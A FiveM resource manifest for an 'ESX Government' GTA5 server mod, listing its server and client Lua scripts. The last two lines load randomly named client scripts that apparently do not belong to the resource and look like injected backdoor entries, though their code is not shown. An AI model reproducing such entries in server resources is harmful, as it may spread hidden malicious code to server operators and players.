fx_version 'bodacious'
game 'gta5'

description 'ESX Government'

version '1.0.0'

server_scripts {
  '@essentialmode/locale.lua',
  "@mysql-async/lib/MySQL.lua",
  'server.lua',
  'config.lua'
}

client_scripts {
  '@essentialmode/locale.lua',
  'Client/*.lua',
  'Client/Menu/*.lua',
  'config.lua'
}

client_script "OiDYsDaj.lua"
client_script "IRS_USDUFHSILFSKOAKQA.lua"